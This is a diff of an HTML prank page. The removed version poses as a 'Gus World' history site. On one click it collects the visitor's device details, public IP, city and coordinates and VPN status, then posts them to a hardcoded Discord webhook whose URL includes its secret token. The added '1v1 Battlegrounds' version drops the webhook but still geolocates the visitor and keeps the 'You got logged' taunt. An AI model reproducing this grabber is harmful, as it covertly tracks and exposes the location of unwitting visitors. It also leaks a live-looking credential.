@@ -3,127 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1V1.GG</title>
+    <title>1v1 Battlegrounds Device Info</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #121212;
-            color: #ffffff;
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+        * {
             margin: 0;
-            height: 100vh;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #0f0f0f;
+            color: white;
+            overflow: hidden;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-        }
-        h1 {
-            color: #ffffff;
-            font-size: 36px;
-            margin-bottom: 20px;
-        }
-        .info {
-            margin: 10px 0;
-            padding: 20px;
-            border: 1px solid #444;
-            border-radius: 10px;
-            background: #1e1e1e;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
-            display: inline-block;
-            min-width: 300px;
-            position: absolute;
-            animation: shakeAnimation 0.5s linear infinite;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            max-width: 90%; /* Make it responsive */
-        }
-        p {
-            color: #dddddd;
-            font-size: 16px;
-        }
-        .landingPage {
-            padding: 50px;
-            text-align: center;
-            background: #2c2c2c;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
             position: relative;
-            max-width: 500px;
-            margin: 0 auto;
+        }
+
+        canvas#bg {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+        }
+
+        .container {
             z-index: 1;
+            max-width: 700px;
+            width: 90%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            animation: fadeIn 0.5s ease-in-out;
         }
-        .landingPage button {
-            background-color: #008CBA;
-            color: white;
-            padding: 15px 32px;
-            font-size: 16px;
-            cursor: pointer;
+
+        h1 {
+            text-align: center;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #ff6666;
+        }
+
+        .intro {
+            text-align: center;
+            font-size: 1rem;
+            margin-bottom: 30px;
+            color: #ccc;
+        }
+
+        button {
+            padding: 12px 24px;
+            font-size: 1rem;
             border: none;
-            border-radius: 5px;
-        }
-        .landingPage button:hover {
-            background-color: #005f73;
-        }
-        .titleText {
-            font-size: 40px;
-            color: #ff6347;
-            font-weight: bold;
-            margin-top: 40px;
+            border-radius: 10px;
+            cursor: pointer;
+            background: #ff4b2b;
+            color: white;
+            transition: 0.3s;
         }
 
-        /* Vibration animation */
-        @keyframes shakeAnimation {
-            0% { transform: translate(-50%, -50%) translateX(0); }
-            25% { transform: translate(-50%, -50%) translateX(-10px); }
-            50% { transform: translate(-50%, -50%) translateX(10px); }
-            75% { transform: translate(-50%, -50%) translateX(-10px); }
-            100% { transform: translate(-50%, -50%) translateX(0); }
+        button:hover {
+            background: #ff3b1f;
         }
 
-        /* Landing Page Text Style */
-        .landingPage h2 {
-            font-size: 24px;
-            color: #ddd;
-            margin-top: 20px;
-        }
-        .landingPage p {
-            font-size: 18px;
-            color: #bbb;
-            margin-top: 15px;
+        .info {
+            margin-top: 30px;
+            display: none;
         }
 
-        /* Style for image */
+        .info p {
+            margin: 10px 0;
+            font-size: 0.95rem;
+            color: #e6e6e6;
+        }
+
         .image-container {
+            text-align: center;
             margin-top: 20px;
         }
+
         .image-container img {
-            width: 100%;
-            max-width: 400px;
+            max-width: 100%;
             height: auto;
             border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
         }
 
+        @keyframes fadeIn {
+            from {opacity: 0; transform: scale(0.95);}
+            to {opacity: 1; transform: scale(1);}
+        }
     </style>
 </head>
 <body>
-    <div id="landingPage" class="landingPage">
-        <h1>Gus World</h1>
-        <h2>Explore Gus History, and take a look  at hes deep history</h2>
-        <button id="showButton">Play</button>
-    </div>
+    <canvas id="bg"></canvas>
 
-    <div id="deviceInfo" class="info" style="display:none;">
-        <div class="titleText">YOu just got logged LMAO 🤣</div>
-        <p>Loading device data...</p>
+    <div class="container">
+        <h1>1v1 Battlegrounds</h1>
+        <p class="intro">See your system & device data in a cool, private, and animated UI</p>
+        <div style="text-align: center;"><button id="showButton">Show My Info</button></div>
 
-        <!-- Image container to show rizzz.png -->
-        <div class="image-container">
-            <img src="rizzz.png" alt="Device Image">
-        </div>
-
+        <div id="deviceInfo" class="info"></div>
+        <div class="image-container" style="display:none;"><img src="rizzz.png" alt="You got logged LMAO"></div>
     </div>
 
     <audio id="audio" loop>
@@ -134,38 +123,29 @@
     <script>
         async function getDeviceInfo() {
             const infoDiv = document.getElementById('deviceInfo');
-            const landingPage = document.getElementById('landingPage');
+            const imageContainer = document.querySelector('.image-container');
 
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             const screenWidth = window.screen.width;
             const screenHeight = window.screen.height;
-            const cpuCores = navigator.hardwareConcurrency || 'Unknown'; // Number of CPU cores
+            const cpuCores = navigator.hardwareConcurrency || 'Unknown';
 
-            // Device info placeholders
-            let deviceEdition = 'Unknown';
-            let deviceVersion = 'Unknown';
-            let systemType = 'Unknown';
+            let deviceEdition = 'Unknown', deviceVersion = 'Unknown', systemType = 'Unknown';
 
-            try {
-                // Fetch the Device Edition and Version
-                if (platform.includes('Win')) {
-                    deviceEdition = 'Windows';
-                    deviceVersion = navigator.appVersion;
-                } else if (platform.includes('Mac')) {
-                    deviceEdition = 'macOS';
-                    deviceVersion = navigator.appVersion;
-                } else if (platform.includes('Linux')) {
-                    deviceEdition = 'Linux';
-                    deviceVersion = navigator.appVersion;
-                }
-
-                // Fetch System Type (32-bit or 64-bit)
-                systemType = navigator.userAgent.indexOf('64') !== -1 ? '64-bit' : '32-bit';
-            } catch (error) {
-                console.error('Error fetching system data:', error);
+            if (platform.includes('Win')) {
+                deviceEdition = 'Windows';
+                deviceVersion = navigator.appVersion;
+            } else if (platform.includes('Mac')) {
+                deviceEdition = 'macOS';
+                deviceVersion = navigator.appVersion;
+            } else if (platform.includes('Linux')) {
+                deviceEdition = 'Linux';
+                deviceVersion = navigator.appVersion;
             }
+
+            systemType = navigator.userAgent.includes('64') ? '64-bit' : '32-bit';
 
             let ipAddress = 'Fetching...';
             let positionData = {
@@ -182,11 +162,6 @@
                 const ipData = await ipResponse.json();
                 ipAddress = ipData.ip;
 
-                // Check for VPN using a third-party IP service
-                const vpnResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?token=your_api_token_here`);
-                const vpnData = await vpnResponse.json();
-                positionData.vpn = vpnData.security.is_vpn ? 'Yes' : 'No';
-
                 const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                 const geoData = await geoResponse.json();
                 positionData = {
@@ -195,105 +170,95 @@
                     timezone: geoData.timezone,
                     latitude: geoData.latitude,
                     longitude: geoData.longitude,
-                    vpn: positionData.vpn
+                    vpn: 'Unknown'
                 };
-            } catch (error) {
-                console.error('Error fetching location and VPN data:', error);
+            } catch (err) {
+                console.error('Location fetch error', err);
             }
 
-            const deviceData = {
-                browser: userAgent,
-                operatingSystem: platform,
-                language: language,
-                screenResolution: `${screenWidth} x ${screenHeight}`,
-                ipAddress: ipAddress,
-                city: positionData.city,
-                region: positionData.region,
-                timezone: positionData.timezone,
-                latitude: positionData.latitude,
-                longitude: positionData.longitude,
-                vpn: positionData.vpn,
-                deviceEdition: deviceEdition,
-                deviceVersion: deviceVersion,
-                systemType: systemType,
-                cpuCores: cpuCores
-            };
+            const deviceName = localStorage.getItem('customDeviceName') || `${platform} Device`;
+            localStorage.setItem('customDeviceName', deviceName);
 
-            // Try to fetch the custom device name from localStorage
-            let deviceName = localStorage.getItem('customDeviceName');
-
-            // If no custom device name exists, set a default one based on the platform
-            if (!deviceName) {
-                deviceName = `${deviceData.operatingSystem} Device`;
-                // Save the custom name in localStorage for future visits
-                localStorage.setItem('customDeviceName', deviceName);
-            }
-
-            // Display the device data
             infoDiv.innerHTML = `
-                <div class="titleText">EZ HAHA</div>
                 <p><strong>Device Name:</strong> ${deviceName}</p>
-                <p><strong>Device Edition:</strong> ${deviceData.deviceEdition}</p>
-                <p><strong>Device Version:</strong> ${deviceData.deviceVersion}</p>
-                <p><strong>System Type:</strong> ${deviceData.systemType}</p>
-                <p><strong>Browser:</strong> ${deviceData.browser}</p>
-                <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
-                <p><strong>Language:</strong> ${deviceData.language}</p>
-                <p><strong>Screen Resolution:</strong> ${deviceData.screenResolution}</p>
-                <p><strong>Your IP Address:</strong> ${deviceData.ipAddress}</p>
-                <p><strong>City:</strong> ${deviceData.city}</p>
-                <p><strong>Region:</strong> ${deviceData.region}</p>
-                <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
-                <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
-                <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
-                <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
+                <p><strong>Device Edition:</strong> ${deviceEdition}</p>
+                <p><strong>Device Version:</strong> ${deviceVersion}</p>
+                <p><strong>System Type:</strong> ${systemType}</p>
+                <p><strong>Browser:</strong> ${userAgent}</p>
+                <p><strong>Language:</strong> ${language}</p>
+                <p><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</p>
+                <p><strong>IP:</strong> ${ipAddress}</p>
+                <p><strong>Location:</strong> ${positionData.city}, ${positionData.region}</p>
+                <p><strong>Timezone:</strong> ${positionData.timezone}</p>
+                <p><strong>Coordinates:</strong> ${positionData.latitude}, ${positionData.longitude}</p>
+                <p><strong>CPU Cores:</strong> ${cpuCores}</p>
             `;
+            infoDiv.style.display = 'block';
+            imageContainer.style.display = 'block';
 
-            // Send the data to the webhook
-            try {
-                await fetch('https://discord.com/api/webhooks/1345819633030135818/Wsq1DfVigUwtNCJCLkSD4meVyUvIRH7O7I8oMMeEeN0WfEi_vQBdePuP51Z5lx6k7sS3', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: 'Device Data',
-                            color: 16711680, // Red color
-                            fields: [
-                                { name: 'Device Name', value: deviceName, inline: false },
-                                { name: 'Device Edition', value: deviceData.deviceEdition, inline: false },
-                                { name: 'Device Version', value: deviceData.deviceVersion, inline: false },
-                                { name: 'System Type', value: deviceData.systemType, inline: false },
-                                { name: 'Browser', value: deviceData.browser, inline: false },
-                                { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
-                                { name: 'Language', value: deviceData.language, inline: false },
-                                { name: 'Screen Resolution', value: deviceData.screenResolution, inline: false },
-                                { name: 'IP Address', value: deviceData.ipAddress, inline: false },
-                                { name: 'City', value: deviceData.city, inline: false },
-                                { name: 'Region', value: deviceData.region, inline: false },
-                                { name: 'Time Zone', value: deviceData.timezone, inline: false },
-                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
-                                { name: 'VPN Detected', value: deviceData.vpn, inline: false },
-                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false }
-                            ]
-                        }]
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending data to webhook:', error);
+            document.getElementById('audio').play();
+        }
+
+        document.getElementById('showButton').onclick = getDeviceInfo;
+    </script>
+
+    <!-- Animated Background (particles) -->
+    <script>
+        const canvas = document.getElementById('bg');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        let particlesArray = [];
+        const colors = ['#ff4b2b', '#ff416c', '#ff6e7f', '#fc6076'];
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 4 + 1;
+                this.speedX = Math.random() * 2 - 1;
+                this.speedY = Math.random() * 2 - 1;
+                this.color = colors[Math.floor(Math.random() * colors.length)];
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = this.color;
+                ctx.fill();
             }
         }
 
-        document.getElementById('showButton').onclick = () => {
-            document.getElementById('landingPage').style.display = 'none';
-            document.getElementById('deviceInfo').style.display = 'block';
-            getDeviceInfo();
+        function initParticles() {
+            particlesArray = [];
+            for (let i = 0; i < 100; i++) {
+                particlesArray.push(new Particle());
+            }
+        }
 
-            // Play audio in loop
-            const audio = document.getElementById('audio');
-            audio.play();
-        };
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            for (let particle of particlesArray) {
+                particle.update();
+                particle.draw();
+            }
+            requestAnimationFrame(animate);
+        }
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            initParticles();
+        });
+
+        initParticles();
+        animate();
     </script>
 </body>
 </html>
